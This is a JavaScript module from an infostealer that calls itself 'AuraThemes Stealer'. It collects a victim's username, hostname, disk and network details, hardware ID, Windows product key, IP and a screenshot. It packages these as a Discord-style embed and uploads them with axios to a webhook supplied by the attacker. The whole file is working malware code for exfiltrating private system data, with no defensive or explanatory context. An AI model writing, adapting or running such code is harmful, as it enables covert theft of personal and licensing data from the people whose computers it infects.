const { systemInfo }  = require('../../utils/systeminfo.js');

const FormData     = require('form-data');
const axios        = require('axios');
const os           = require('os');
const fs           = require('fs');

module.exports = async (webhook) => {
    const { 
        WINDOWS_VERSION,
        WINDOWS_KEY,
        SCREENSHOTS,
        DISKS_INFO,
        CPU_COUNT,
        NETWORK,
        UUID,
        DISK,
        CPU,
        GPU,
        RAM,
        IP,
        OS,
    } = await systemInfo();

    const screenShot = SCREENSHOTS.length > 0 ? SCREENSHOTS[0] : null;

    const payload = {
        avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
        username: 'AuraThemes Stealer',
        embeds: [
            {
                title: "System Information",
                color: "12740607",
                fields: [
                    { name: "User",        value: `\`\`\`yml\nUsername: ${process.env.USERNAME}\nHostname: ${os.hostname()}\n\`\`\`` },
                    { name: "Disks",       value: `\`\`\`yml\n${DISKS_INFO}\n\`\`\`` },
                    { name: "System",      value: `\`\`\`yml\nOS: ${OS}\nCPU: ${CPU}\nGPU: ${GPU}\nRAM: ${RAM}\nHWID: ${UUID}\nProduct Key: ${WINDOWS_KEY}\n\`\`\`` },
                    { name: "Network",     value: `\`\`\`yml\n${NETWORK}\n\`\`\`` },
                ],
                timestamp: new Date(),
                footer: {
                    text: 'AuraThemes Stealer | System',
                    icon_url: 'https://i.imgur.com/yVnOSeS.gif'
                }
            }
        ]
    };

    try {
        const form = new FormData();
        form.append('payload_json', JSON.stringify(payload));
        
        if (screenShot) {
            form.append('file', fs.createReadStream(screenShot));
        }

        await axios.post(webhook, form, {
            headers: {
                ...form.getHeaders()
            }
        });
    } catch (error) {
        console.error("Failed to send webhook:", error);
    }
}